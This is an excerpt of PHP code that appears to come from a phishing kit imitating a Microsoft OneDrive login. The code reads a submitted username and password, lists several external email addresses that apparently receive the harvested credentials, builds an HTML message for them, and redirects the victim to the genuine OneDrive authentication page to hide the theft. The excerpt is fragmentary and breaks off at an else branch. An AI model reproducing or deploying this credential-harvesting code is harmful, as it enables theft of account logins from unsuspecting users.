...
$login = $_POST['ai'];
$passwd = $_POST['pr'];
$own = 'logs.me@yandex.com, logins.amg@gmail.com, amgghostserver@gmail.com, amgghostserver@hotmail.com';
...
$over = 'https://onedrive.live.com/about/auth/';
$msg = "<HTML><BODY>
 <TABLE>
...
header( "Location: https://onedrive.live.com/about/auth/" );
}
else {
